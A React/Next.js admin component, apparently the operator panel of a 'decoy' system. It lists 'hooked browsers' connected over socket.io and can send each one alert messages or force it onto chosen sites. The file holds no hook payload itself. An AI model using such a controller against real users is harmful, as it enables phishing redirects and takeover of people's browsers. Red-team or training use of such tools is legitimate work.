'use client';
import { useEffect, useState } from "react";
import { useRouter } from 'next/navigation';

import Button from "@mui/material/Button";
import { TextField } from "@mui/material";
import adminStyles from "@/components/adminDecoy/adminDecoy.module.css";
import { socket } from "@/app/socket.js";
import { getWebSites } from "@/actions/actions.jsx";
export default function Home() {

  const [webSitesInProject, setWebSitesInProject] = useState([]);

  const [message, setMessage] = useState("");
  const [isConnected, setIsConnected] = useState(false);
  const [transport, setTransport] = useState("N/A");
  const [userList, setUserList] = useState([]);
  const router = useRouter();

  useEffect(() => {
    if (socket.connected) {
      onConnect();
    }

    function onConnect() {
      setIsConnected(true);
      setTransport(socket.io.engine.transport.name);

      socket.io.engine.on("upgrade", (transport) => {
        setTransport(transport.name);
      });

      socket.emit("join", "Decoy Controller");
      socket.on("UserList", handleUserList);
    }

    function onDisconnect() {
      setIsConnected(false);
      setTransport("N/A");
      // Remove event listener when disconnecting
      socket.off("UserList", handleUserList);
    }

    // Define function to handle "UserList" event
    function handleUserList(userList) {
      userList = userList.filter(
        (user, index) => userList.indexOf(user) === index && user !== null
      );
      userList = userList.filter((user) => user !== "Decoy Controller");
      setUserList(userList);
    }

    socket.on("connect", onConnect);
    socket.on("disconnect", onDisconnect);

    return () => {
      socket.off("connect", onConnect);
      socket.off("UserList", handleUserList);
      socket.off("disconnect", onDisconnect);
    };
  }, [router]);

  useEffect(() => {
    getWebSites().then((data) => {
      setWebSitesInProject(data);
    });
  }, [router])

  const handleAlertClick = (userId) => {
    if (socket) {
      console.log("Alerting user with message: ", message);
      socket.emit("alert", message, { userId: `${userId}` });
    } else {
      console.error("Socket is not initialized.");
    }
  };
  const handleMessageChange = (event) => {
    setMessage(event.target.value);
  };

  const handleTextFieldKeyPress = (event, userId) => {
    if (event.key === 'Enter') {
      handleAlertClick(userId);
    }
  };

  const handlePushToPageClick = (site, userId) => {
    console.log("Pushing to page", site);
    if (socket) {
      socket.emit("pushToPage", site, { userId: `${userId}` });
    } else {
      console.error("Socket is not initialized.");
    }
  };

  return (
    <div>
     
      <div className={adminStyles.dataColumn}>
        {userList.length > 0 ? (
          userList.map((user, index) => (
            <div key={index} className={adminStyles.userData}>
              <div className={adminStyles.data}>
                <h2>Connected User</h2>
                <h3>{user}</h3>
                <div className={adminStyles.alertOptions}>
                  <TextField
                    id="message"
                    label="Message"
                    variant="standard"
                    color="success"
                    value={message}
                    onChange={handleMessageChange}
                    style={{ marginBottom: "1%" }}
                    onKeyDown={(event) => handleTextFieldKeyPress(event, user)}
                  />
                  <Button
                    variant="contained"
                    color="success"
                    onClick={() => handleAlertClick(user)}
                    style={{ margin: "1%" }}
                  >
                    Alert
                  </Button>
                  {webSitesInProject.length > 0 && webSitesInProject.map((site, index) => (
                    <Button
                      key={site.id || index} // Use index as key if site.id is not defined
                      variant="contained"
                      color="success"
                      onClick={() => handlePushToPageClick(site.name, user)}
                      style={{ margin: "1%" }}
                    >
                      Push {site.name}
                    </Button>
                  ))}
                </div>
              </div>
            </div>
          ))
        ) : (
          <p>No hooked Browsers!</p>
        )}
      </div>

      <div className={adminStyles.contentRow}>
        <Button style={{ margin: "10px" }} variant="contained" color="success" onClick={() => router.push("/admin")}>
          Back
        </Button>
      </div>
    </div>
  );
};


